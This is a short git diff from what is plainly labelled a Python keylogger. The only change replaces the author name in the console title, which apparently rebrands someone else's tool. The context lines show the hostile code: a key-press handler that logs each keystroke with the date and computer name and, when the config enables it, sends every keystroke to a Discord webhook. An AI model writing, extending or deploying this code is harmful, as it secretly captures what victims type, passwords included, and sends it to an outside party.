@@ -16,7 +16,7 @@ with open("config.json") as f:
     ext = json.load(f)
 
 def on_press(key):
-    os.system("title Coded by ExtremeDev | KeyLogger")
+    os.system("title Coded by AmineMrx | KeyLogger")
     print(f"| Date: {today} | KEY: {str(key)} | PC name: {pcname} |")
     if ext['webhook'] == "true":
         webhook = DiscordWebhook(url=ext['webhook-id'], content=f"| Date: {today} | KEY: {str(key)} | PC name: {pcname} |",  username=ext['webhook-name'])
